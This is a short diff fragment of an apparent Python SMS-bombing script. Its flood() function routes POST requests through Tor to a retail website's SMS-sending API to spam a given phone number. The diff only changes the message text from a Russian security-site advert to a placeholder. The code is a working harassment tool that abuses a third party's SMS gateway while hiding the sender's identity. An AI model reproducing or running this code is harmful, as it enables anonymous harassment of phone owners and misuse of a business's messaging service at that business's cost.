@@ -14,7 +14,7 @@ def get_tor_session():
 session = get_tor_session()
 
 def flood(phone):
-    text = "информационная безопасность overnull.ru\n\n"
+    text = "текст\n\n"
     url = f"https://elis.ru/api/sms/sendSms/{text}/{phone}/"
 
     response = session.post(url=url, headers={"X-Requested-With": "XMLHttpRequest"})
